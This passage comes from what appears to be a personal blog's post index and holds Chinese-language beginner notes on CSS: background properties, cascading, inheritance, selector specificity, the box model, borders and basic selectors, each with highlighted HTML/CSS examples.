class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">105</span>, <span class="number">101</span>, <span class="number">101</span>, .<span class="number">6</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">255px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">42px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">42px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#ff6f00</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>手机 电话卡<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>电视 盒子<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>笔记本 平板<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>出行 穿戴<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>智能 路由器<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>健康 儿童<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>二级 音响<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS背景图片"><a href="#CSS背景图片" class="headerlink" title="CSS背景图片"></a>CSS背景图片</h2><h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><p>background-color 属性定义了元素的背景颜色，一般情况下元素背景颜色默认值是transparent(透明),我们也可以手动指定背景颜色为透明色。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">221</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>background-image: url() 属性定义了元素的背景图片。实际开发常用于logo或者一些装饰性的小图片或者超大的背景图片，优点是非常便于控制位置。（精灵图也是一种运用场景）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">959px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">959px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">https://www.xpctf.cn/img/avatar.png</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="背景平铺"><a href="#背景平铺" class="headerlink" title="背景平铺"></a>背景平铺</h3><p>background-repeat 属性定义元素的平铺效果，四个属性值：repeat|no-repeat|repeat-x|repeat-y</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">            background-repeat: no-repeat;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="背景图片的位置"><a href="#背景图片的位置" class="headerlink" title="背景图片的位置"></a>背景图片的位置</h3><p>background-position: 属性可以改变图片在背景中的位置。参数值可以单位名词、xy坐标值、百分比。</p><ul><li>如果指定的值两个都是方位名词，则两个值前后顺序无关，比如left top 和 top left 效果一样</li><li>如果只指定了一个方位名词，另一个护理，则第二个值默认水平居中</li></ul><p>语法：background-position:x y;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">http://www.cnlogo8.com/images/logo.gif</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f0f</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="背景图像固定"><a href="#背景图像固定" class="headerlink" title="背景图像固定"></a>背景图像固定</h3><p>background-attachment: fixed; 属性可以设置背景图片固定而不是随着页面其他内容滚动，值设置成scrool可以随页面滚动，默认为scrool。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">title_sprite.png</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-attachment</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="背景复合写法"><a href="#背景复合写法" class="headerlink" title="背景复合写法"></a>背景复合写法</h3><p>为了简化背景属性的代码，我们可以将这些属性合并简写在同一个属性bocakground中，从而节约代码量，当使用简写属性时，没有特定的书写顺序，一般习惯约定顺序为：</p><blockquote><p>bakcground: 背景颜色 背景图片地址 背景平铺 背景图像滚动 背景图片位置</p></blockquote><h3 id="半透明背景"><a href="#半透明背景" class="headerlink" title="半透明背景"></a>半透明背景</h3><p>使用rgba(0,0,0,1)来设置颜色，最后一个是透明度，取值范围为0-1。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, .<span class="number">5</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>看见我看见我<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSS三大特性"><a href="#CSS三大特性" class="headerlink" title="CSS三大特性"></a>CSS三大特性</h2><h3 id="层叠性"><a href="#层叠性" class="headerlink" title="层叠性"></a>层叠性</h3><p>相同选择器给设置相同的样式，此时一个样式就会覆盖(层叠)另一个冲突的样式。层叠性主要解决样式冲突的问题。<br>层叠性原则：</p><ul><li>样式冲突时，遵循就近原则，谁离结构近执行谁</li><li>样式不冲突，不会层叠</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: salmon;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">231</span>, <span class="number">64</span>, <span class="number">209</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我不知道我是那个颜色，我好迷茫<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h3><p>子标签会继承父标签的某些样式，如文本颜色和字号。</p><ul><li>恰当地使用继承可以简化代码，降低CSS样式的复杂性</li><li>子元素可以继承父元素的样式（text-、font-、line-这些元素开头的可以继承，以及color属性）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: slateblue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">tab-size</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            p标签会继承div的样式</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><table><thead><tr><th align="center">选择器</th><th align="center">选择器权重</th></tr></thead><tbody><tr><td align="center">继承和*</td><td align="center">0,0,0,0</td></tr><tr><td align="center">标签选择器</td><td align="center">0,0,0,1</td></tr><tr><td align="center">类选择器，伪类选择器</td><td align="center">0,0,1,0</td></tr><tr><td align="center">ID选择器</td><td align="center">0,1,0,0</td></tr><tr><td align="center">行内样式 style&#x3D;””</td><td align="center">1,0,0,0</td></tr><tr><td align="center">!important</td><td align="center">无穷大</td></tr></tbody></table><h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><h3 id="盒子模型组成"><a href="#盒子模型组成" class="headerlink" title="盒子模型组成"></a>盒子模型组成</h3><p>盒子模型：就是把HTML页面中的布局元素看作是一个矩形的盒子，也就是一个盛装内容的容器。CSS盒子模型本质是一个盒子，封装周围的HTML元素，它包括：边框、外边距、内边距和实际内容。<br><img src="https://img.xpctf.cn/img/20200920201049.png"></p><h3 id="边框（border）"><a href="#边框（border）" class="headerlink" title="边框（border）"></a>边框（border）</h3><p>borber可以设置元素的边框，边框又三部分组成：边框宽度(粗细)边框样式和边框颜色。</p><blockquote><p>border: borber-width borber-style borber-color全<br>border-top: borber-width borber-style borber-color上<br>border-bottom: borber-width borber-style borber-color下<br>border-left: borber-width borber-style borber-color左<br>border-right: borber-width borber-style borber-color右</p></blockquote><h3 id="表格的细线边框"><a href="#表格的细线边框" class="headerlink" title="表格的细线边框"></a>表格的细线边框</h3><p>border-collapse 属性控制浏览器绘制表格边框的方式。它控制相邻单元格的边框。</p><blockquote><p>border-collapse: collapse;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习</title>
      <link href="/posts/a5a9/"/>
      <url>/posts/a5a9/</url>
      
        <content type="html"><![CDATA[<h2 id="CSS基础学习"><a href="#CSS基础学习" class="headerlink" title="CSS基础学习"></a>CSS基础学习</h2><h3 id="CSS是什么"><a href="#CSS是什么" class="headerlink" title="CSS是什么"></a>CSS是什么</h3><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><h3 id="CSS语法规范"><a href="#CSS语法规范" class="headerlink" title="CSS语法规范"></a>CSS语法规范</h3><p>CSS规则由两个主要的部分构成：选择器以及一条或多条声明。<br><img src="https://img.xpctf.cn/img/20200916103214.png"></p><h3 id="CSS语法基础"><a href="#CSS语法基础" class="headerlink" title="CSS语法基础"></a>CSS语法基础</h3><p>CSS通常写在head标签中，使用style标签包含，一定要以’;’结尾，键和值之间使用’:’分割。<br><img src="https://img.xpctf.cn/img/20200916103832.png"></p><h3 id="CSS代码风格"><a href="#CSS代码风格" class="headerlink" title="CSS代码风格"></a>CSS代码风格</h3><p>对应CSS，代码书写风格不是强制规范，而是符合实际开发书写方式，让代码更利于阅读或检查。</p><p>1、样式格式书写</p><p>① 紧凑风格</p><blockquote><p>p {color: rde;font-size: 120px;}</p></blockquote><p>② 展开风格</p><blockquote><p>p {<br>   color: red;<br>   font-size: 120px;<br>}</p></blockquote><p>2、 样式大小写<br>CSS不区分大小写，大小写都能执行，但推荐使用小写字母。</p><p>3、 空格规范</p><p>① 属性值前，冒号后，保留一个空格<br>② 选择器和大括号之前保留一个空格</p><h3 id="选择器的作用"><a href="#选择器的作用" class="headerlink" title="选择器的作用"></a>选择器的作用</h3><p>选择器可以根据不同的需求把不同的标签选出来，当一个页面存在多个相同标签时，选择器的作用就体现出来了。<br>如果使用p来选择，会把所有的p标签改成红色，这是可以使用选择器来单独选取。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>把这个p改成红色<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这个p不改<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="选择器的分类"><a href="#选择器的分类" class="headerlink" title="选择器的分类"></a>选择器的分类</h3><p>基础选择器：基础选择器是由单个选择器组成的<br>复合选择器：标签选择器、类选择器、id选择器、通配符选择器</p><h4 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h4><p>标签选择器(元素选择器)是指用HTML的标签名作为选择器，按标签名称分类，为页面中某一类标签指定统一的CSS样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: green;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: pink;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>男生<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>男生<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>男生<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>女生<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>女生<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>女生<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><p>如果想要差异化选择不同的标签，单独选一个或者某几个标签，可以使用类选择器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.red</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        